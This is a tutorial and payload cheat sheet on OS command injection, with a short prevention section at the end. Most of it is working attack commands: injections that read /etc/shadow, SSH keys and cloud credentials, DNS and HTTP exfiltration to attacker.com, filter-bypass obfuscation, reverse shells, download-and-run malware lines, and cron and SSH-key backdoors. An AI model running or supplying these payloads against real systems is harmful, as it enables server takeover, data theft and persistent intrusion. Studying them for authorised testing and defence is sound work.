# OS command injection (shell injection)

OS command injection allows attackers to execute arbitrary operating system commands on the server running an application. This typically leads to complete server compromise, including access to application data, system files, credentials, and often provides a pivot point to attack internal infrastructure. Unlike other injection attacks, successful command injection often grants immediate system-level access.

Command injection is particularly devastating because it bridges the gap between web application vulnerabilities and direct operating system control.

> Only test systems you own or are explicitly authorized to assess.

## What is OS command injection? (concept and impact)

### The vulnerability

Applications sometimes execute system commands to interact with the underlying OS:

**Vulnerable code example (Python):**
```python
import subprocess

product_id = request.args.get('productID')
store_id = request.args.get('storeID')

# VULNERABLE: User input directly in shell command
command = f"stockreport.pl {product_id} {store_id}"
result = subprocess.call(command, shell=True)
```

**Normal request:**
```
GET /stockStatus?productID=381&storeID=29
Command executed: stockreport.pl 381 29
```

**Attack payload:**
```
GET /stockStatus?productID=381&storeID=29;whoami
Command executed: stockreport.pl 381 29;whoami
```

Result: Two commands execute - the intended one and `whoami`.

### Why applications execute OS commands

Common scenarios:
- Legacy system integration (calling old Perl/shell scripts)
- File processing (ImageMagick, FFmpeg conversions)
- Network operations (ping, nslookup, traceroute)
- System administration (backup, log rotation)
- Document generation (LaTeX, Pandoc)
- Email sending (sendmail, mail command)

### Impact of successful exploitation

**Immediate access:**
- Read/write arbitrary files
- View application source code and configs
- Access database credentials
- Read environment variables (API keys, secrets)
- Execute commands as web server user (www-data, nginx, IIS APPPOOL)

**Privilege escalation:**
- Kernel exploits to gain root
- Sudo misconfigurations
- SUID binaries
- Scheduled task hijacking

**Lateral movement:**
- Access to internal network
- Steal SSH keys for other servers
- Access cloud metadata services (AWS credentials)
- Pivot to database servers, internal APIs

**Persistent access:**
- Install backdoors, rootkits
- Add SSH keys
- Create new admin accounts
- Schedule malicious cron jobs

## Basic OS command injection

### Command separators (chaining commands)

#### Works on Linux and Windows:
```bash
&   - Execute next command regardless of previous result
&&  - Execute next command only if previous succeeded
|   - Pipe output of first command to second
||  - Execute second command only if first failed
```

#### Works on Linux/Unix only:
```bash
;   - Command separator
\n  - Newline (0x0a)
```

#### Inline execution (Linux/Unix):
```bash
`command`           - Backticks (command substitution)
$(command)          - Dollar parentheses (command substitution)
```

### Basic exploitation examples

**Original vulnerable request:**
```
GET /stockStatus?productID=381&storeID=29
```

**Injection with semicolon (Linux):**
```
GET /stockStatus?productID=381;whoami&storeID=29
Command: stockreport.pl 381;whoami 29
Result: Executes stockreport.pl 381, then whoami, then tries to execute 29
```

**Injection with ampersand (Linux and Windows):**
```
GET /stockStatus?productID=381&whoami&storeID=29
Command: stockreport.pl 381 & whoami & 29
Result: Three separate commands execute
```

**Injection with pipe:**
```
GET /stockStatus?productID=381|whoami&storeID=29
Command: stockreport.pl 381 | whoami 29
Result: Output of stockreport.pl piped to whoami
```

**Injection with command substitution:**
```
GET /stockStatus?productID=381$(whoami)&storeID=29
Command: stockreport.pl 381$(whoami) 29
Result: whoami executes, output substituted into command
```

### Testing for command injection

**Step 1: Identify injection point**

Look for parameters that might be passed to system commands:
- Filenames: `file=`, `document=`, `path=`
- Network operations: `ip=`, `host=`, `domain=`
- Email addresses: `email=`, `recipient=`
- Any user input processed by system utilities

**Step 2: Test with harmless command**

```bash
# Echo test
& echo vulnerable &

# Sleep test (time delay)
& sleep 10 &

# DNS lookup test
& nslookup attacker.com &
```

**Step 3: Confirm execution**

If application returns output containing "vulnerable", takes 10 seconds to respond, or you see DNS request to your server → vulnerability confirmed.

### Exploitation payload structure

**Template:**
```
[original value][separator][injected command][separator]
```

**Why trailing separator matters:**

Without trailing separator:
```
stockreport.pl 381 & whoami & 29
                              ^^ This causes error: "29: command not found"
```

With trailing separator:
```
stockreport.pl 381 & whoami &
                            ^^ Clean execution, no trailing garbage
```

**Better payload:**
```
381 & whoami &
```

Or completely replace original value:
```
; whoami ;
```

## Useful enumeration commands

### System information

**Linux:**
```bash
whoami              # Current user
id                  # User ID and groups
uname -a            # Kernel version and architecture
cat /etc/os-release # OS distribution
hostname            # System hostname
pwd                 # Current directory
```

**Windows:**
```cmd
whoami              # Current user
whoami /all         # Detailed user info
ver                 # Windows version
systeminfo          # Comprehensive system info
hostname            # Computer name
echo %CD%           # Current directory
```

### Network configuration

**Linux:**
```bash
ifconfig            # Network interfaces (older systems)
ip addr             # Network interfaces (modern)
ip route            # Routing table
cat /etc/resolv.conf # DNS servers
netstat -an         # Network connections
ss -tulpn           # Listening services
```

**Windows:**
```cmd
ipconfig /all       # Network configuration
route print         # Routing table
netstat -an         # Network connections
```

### Running processes

**Linux:**
```bash
ps aux              # All processes
ps -ef              # All processes (different format)
top -n 1            # Process snapshot
```

**Windows:**
```cmd
tasklist            # Running processes
tasklist /v         # Verbose process list
wmic process list   # Detailed process info
```

### File system enumeration

**Linux:**
```bash
ls -la              # List files with permissions
cat /etc/passwd     # User accounts
cat /etc/shadow     # Password hashes (if root)
find / -perm -4000 2>/dev/null  # SUID binaries
ls -la /home        # Home directories
cat ~/.bash_history # Command history
```

**Windows:**
```cmd
dir                 # List files
type C:\windows\win.ini
dir /a C:\          # All files including hidden
net user            # User accounts
net localgroup administrators  # Admin accounts
```

### Reading sensitive files

**Linux:**
```bash
cat /var/www/html/config.php    # Web app config
cat /root/.ssh/id_rsa           # Root SSH key
cat /home/user/.ssh/id_rsa      # User SSH key
cat /proc/self/environ          # Environment variables
cat ~/.aws/credentials          # AWS credentials
```

**Windows:**
```cmd
type C:\inetpub\wwwroot\web.config     # IIS config
type C:\xampp\htdocs\config.php        # Application config
type C:\Users\Administrator\.ssh\id_rsa # SSH key
```

## Blind OS command injection (no output returned)

### Challenge: Output not displayed

Many applications execute commands but don't return output:

```python
# Vulnerable but blind
email = request.form['email']
message = request.form['feedback']

command = f'mail -s "Feedback" admin@site.com -aFrom:{email}'
subprocess.call(command, shell=True)

return "Thank you for your feedback!"  # No command output shown
```

Attack works, but you can't see `whoami` result directly.

### Technique 1: Time-based detection (confirming vulnerability)

**Concept:** Inject command that causes measurable delay.

**Linux payloads:**
```bash
& sleep 10 &
; sleep 10 ;
| sleep 10 |
|| sleep 10 ||

# Using ping
& ping -c 10 127.0.0.1 &

# Using timeout
& timeout 10 sleep 10 &
```

**Windows payloads:**
```cmd
& ping -n 10 127.0.0.1 &
& timeout /t 10 &
```

**Testing workflow:**

```python
import requests
import time

url = "https://target.com/feedback"

# Normal request baseline
start = time.time()
requests.post(url, data={'email': 'test@test.com', 'message': 'hello'})
baseline = time.time() - start
print(f"Baseline: {baseline}s")

# Test with sleep injection
payloads = [
    'test@test.com & sleep 10 &',
    'test@test.com; sleep 10;',
    'test@test.com | sleep 10 |',
]

for payload in payloads:
    start = time.time()
    requests.post(url, data={'email': payload, 'message': 'hello'})
    elapsed = time.time() - start
    
    if elapsed > baseline + 9:  # Allow 1 second variance
        print(f"[+] Vulnerable: {payload} (took {elapsed}s)")
```

**Advantages:**
- Works with any blind injection
- Doesn't require output retrieval
- Easy to automate

**Disadvantages:**
- Network latency can cause false positives/negatives
- Not useful for data exfiltration

### Technique 2: Output redirection (reading results)

**Concept:** Redirect command output to web-accessible file.

**Find web root first:**

Common locations:
```
Linux:
/var/www/html/
/var/www/
/usr/share/nginx/html/
/opt/app/public/
/home/user/public_html/

Windows:
C:\inetpub\wwwroot\
C:\xampp\htdocs\
C:\wamp\www\
```

**Exploitation:**

```bash
# Linux
& whoami > /var/www/html/output.txt &
& id > /var/www/html/id.txt &
& cat /etc/passwd > /var/www/html/passwd.txt &
& ifconfig > /var/www/html/net.txt &
```

**Retrieve output:**
```
https://target.com/output.txt
https://target.com/id.txt
https://target.com/passwd.txt
```

**Windows:**
```cmd
& whoami > C:\inetpub\wwwroot\out.txt &
& ipconfig > C:\inetpub\wwwroot\ipconfig.txt &
```

**Advanced - Append multiple commands:**
```bash
& whoami >> /var/www/html/results.txt &
& id >> /var/www/html/results.txt &
& uname -a >> /var/www/html/results.txt &
```

Single file with all output.

### Technique 3: Out-of-band (OOB/OAST) interaction

**Concept:** Make server contact your external system.

#### Method 1: DNS exfiltration

**Basic DNS lookup:**
```bash
& nslookup attacker.com &
& dig attacker.com &
& host attacker.com &
```

Monitor DNS server logs for request → confirms vulnerability.

**Data exfiltration via DNS:**
```bash
& nslookup `whoami`.attacker.com &
& nslookup $(whoami).attacker.com &
```

**Your DNS server receives:**
```
Query: www-data.attacker.com
Result: Current username is "www-data"
```

**Exfiltrate file contents:**
```bash
& nslookup `cat /etc/passwd | base64`.attacker.com &
```

**Windows:**
```cmd
& nslookup %USERNAME%.attacker.com &
& for /f "tokens=*" %i in ('whoami') do nslookup %i.attacker.com &
```

#### Method 2: HTTP requests

```bash
& curl http://attacker.com/$(whoami) &
& wget http://attacker.com/?data=$(id | base64) &
```

**Your web server receives:**
```
GET /?data=dWlkPTMzKHd3dy1kYXRhKQ== HTTP/1.1
Decoded: uid=33(www-data)
```

#### Method 3: ICMP (ping)

```bash
& ping -c 3 attacker.com &
```

Monitor with tcpdump:
```bash
sudo tcpdump -i eth0 icmp and host attacker.com
```

#### Using Burp Collaborator

Burp Suite Professional provides Collaborator for OOB testing:

**Generate unique subdomain:** `abc123.burpcollaborator.net`

**Payloads:**
```bash
& nslookup abc123.burpcollaborator.net &
& curl abc123.burpcollaborator.net &
& wget abc123.burpcollaborator.net &
```

Burp monitors for HTTP, DNS, SMTP requests to confirm vulnerability.

**Data exfiltration:**
```bash
& nslookup $(whoami).abc123.burpcollaborator.net &
```

## Bypassing filters and WAFs

### Bypass 1: Whitespace alternatives

**If space character blocked:**

```bash
# Tab character
;whoami\t123

# Bash IFS (Internal Field Separator)
;cat</etc/passwd

# Brace expansion
{cat,/etc/passwd}

# Variable substitution
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
```

### Bypass 2: Command obfuscation

**Concatenation:**
```bash
who'ami'
who"ami"
w'h'o'a'm'i
```

**Variable substitution:**
```bash
$USER=whoami;$USER
a=who;b=ami;$a$b
```

**Base64 encoding:**
```bash
echo d2hvYW1p | base64 -d | bash
# d2hvYW1p = base64("whoami")
```

**Hex encoding:**
```bash
echo -e "\x77\x68\x6f\x61\x6d\x69" | bash
```

### Bypass 3: Command alternatives

If specific commands blocked:

**Instead of `cat`:**
```bash
tac /etc/passwd    # Reverse order
head /etc/passwd   # First 10 lines
tail /etc/passwd   # Last 10 lines
more /etc/passwd
less /etc/passwd
nl /etc/passwd     # With line numbers
```

**Instead of `ls`:**
```bash
dir
echo *
printf '%s\n' *
find . -maxdepth 1
```

**Instead of `whoami`:**
```bash
id
id -un
echo $USER
```

### Bypass 4: Case variation (Windows)

Windows is case-insensitive:
```cmd
WhOaMi
WHOAMI
wHoAmI
```

### Bypass 5: Wildcards and globbing

```bash
/bin/c?t /etc/passwd    # ? matches single char
/bin/c*t /etc/passwd    # * matches any chars
/???/c?t /etc/passwd    # /bin/cat
```

### Bypass 6: Comment out trailing content

If injection in middle of command:

```bash
Original: command $USER_INPUT more_args

Injection: ; whoami #
Result: command ; whoami # more_args
```

The `#` comments out everything after.

**Windows:**
```cmd
; whoami &rem 
```

### Bypass 7: Breaking out of quotes

If input is quoted:

**Single quotes:**
```bash
Original: command '$USER_INPUT'
Payload: '; whoami; echo '
Result: command ''; whoami; echo ''
```

**Double quotes:**
```bash
Original: command "$USER_INPUT"
Payload: "; whoami; echo "
Result: command ""; whoami; echo ""
```

**Escape quote:**
```bash
Payload: \"; whoami; echo \"
```

## Advanced exploitation techniques

### Technique 1: Reverse shell

**Why:** Interactive shell access to server.

**Linux bash reverse shell:**
```bash
& bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
& bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' &
```

**Python reverse shell:**
```bash
& python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' &
```

**Netcat:**
```bash
& nc attacker.com 4444 -e /bin/bash &
& rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f &
```

**Listener (on attacker machine):**
```bash
nc -lvnp 4444
```

### Technique 2: Download and execute malware

**Linux:**
```bash
& wget http://attacker.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh &

& curl http://attacker.com/malware.elf -o /tmp/malware && chmod +x /tmp/malware && /tmp/malware &
```

**Windows:**
```cmd
& certutil -urlcache -f http://attacker.com/payload.exe C:\temp\payload.exe && C:\temp\payload.exe &

& powershell -c "Invoke-WebRequest -Uri http://attacker.com/shell.exe -OutFile C:\temp\shell.exe; C:\temp\shell.exe" &
```

### Technique 3: Add persistent backdoor

**Linux - Add SSH key:**
```bash
& echo "ssh-rsa AAAA...attacker_key" >> /root/.ssh/authorized_keys &
```

**Linux - Create scheduled job:**
```bash
& echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab &
```

**Windows - Create scheduled task:**
```cmd
& schtasks /create /tn "Update" /tr "C:\temp\backdoor.exe" /sc onlogon &
```

### Technique 4: Privilege escalation

**Find SUID binaries (Linux):**
```bash
& find / -perm -4000 -type f 2>/dev/null > /var/www/html/suid.txt &
```

**Check sudo permissions:**
```bash
& sudo -l > /var/www/html/sudo.txt &
```

**Exploit kernel vulnerability:**
```bash
& wget http://attacker.com/kernel-exploit -O /tmp/exploit && chmod +x /tmp/exploit && /tmp/exploit &
```

## Real-world exploitation scenarios

### Scenario 1: Image conversion service

**Application:**
```python
# Convert uploaded image to PNG
filename = request.files['image'].filename
subprocess.call(f"convert {filename} output.png", shell=True)
```

**Exploitation:**
```bash
Filename: test.jpg; wget http://attacker.com/shell.sh -O /tmp/s.sh; bash /tmp/s.sh;
```

### Scenario 2: Ping functionality

**Application:**
```php
// PHP ping utility
$host = $_GET['host'];
$result = shell_exec("ping -c 4 " . $host);
echo $result;
```

**Exploitation:**
```
GET /ping?host=127.0.0.1;cat /etc/passwd
```

### Scenario 3: Email feedback form

**Application:**
```python
email = request.form['email']
subprocess.call(f"mail -s 'Feedback' admin@site.com -aFrom:{email}", shell=True)
```

**Blind exploitation with DNS exfiltration:**
```
email=test@test.com & nslookup $(whoami).attacker.com &
```

## Prevention (secure coding practices)

### Best practice: Never use shell=True

**Insecure:**
```python
import subprocess
subprocess.call(f"ping -c 4 {user_input}", shell=True)  # DANGEROUS
```

**Secure:**
```python
import subprocess
subprocess.call(["ping", "-c", "4", user_input])  # Safe - no shell
```

With `shell=False`, command arguments passed as list → no command injection possible.

### Input validation (whitelist approach)

```python
import re

def ping_host(ip):
    # Whitelist: Only valid IP addresses
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        return "Invalid IP address"
    
    # Additional validation
    octets = ip.split('.')
    if any(int(octet) > 255 for octet in octets):
        return "Invalid IP address"
    
    # Safe execution (no shell)
    result = subprocess.run(["ping", "-c", "4", ip], 
                           capture_output=True, 
                           text=True,
                           timeout=10)
    
    return result.stdout
```

### Use safe APIs instead of OS commands

**Instead of:**
```python
# DON'T DO THIS
subprocess.call(f"nslookup {domain}", shell=True)
```

**Use library:**
```python
import socket
try:
    ip = socket.gethostbyname(domain)
    print(f"{domain} resolves to {ip}")
except socket.gaierror:
    print("Domain not found")
```

### Sanitization is insufficient

**This is NOT secure:**
```python
# STILL VULNERABLE
user_input = user_input.replace(';', '').replace('&', '').replace('|', '')
subprocess.call(f"command {user_input}", shell=True)
```

**Why:** Too many metacharacters to block, encoding bypasses exist, newlines, backticks, $(), etc.

### Principle of least privilege

Run web application as unprivileged user:
```bash
# Good: Run as www-data (limited permissions)
www-data  24321  0.0  1.2  app

# Bad: Run as root (full access)
root      24321  0.0  1.2  app
```

### Use containers/sandboxing

- Docker containers with minimal permissions
- chroot jails
- SELinux / AppArmor policies
- Restrict filesystem access

## Quick reference

### Command separators:
```
;     Linux only
&     Both (background)
&&    Both (AND)
|     Both (pipe)
||    Both (OR)
\n    Linux only (newline)
```

### Inline execution:
```
`cmd`     Backticks
$(cmd)    Command substitution
```

### Time-delay payloads:
```
Linux:   & sleep 10 &
         & ping -c 10 127.0.0.1 &
Windows: & timeout /t 10 &
         & ping -n 10 127.0.0.1 &
```

### Out-of-band:
```
& nslookup attacker.com &
& curl http://attacker.com &
& wget http://attacker.com &
& nslookup $(whoami).attacker.com &
```

### Output redirection:
```
& whoami > /var/www/html/out.txt &
& cat /etc/passwd > /tmp/result.txt &
```
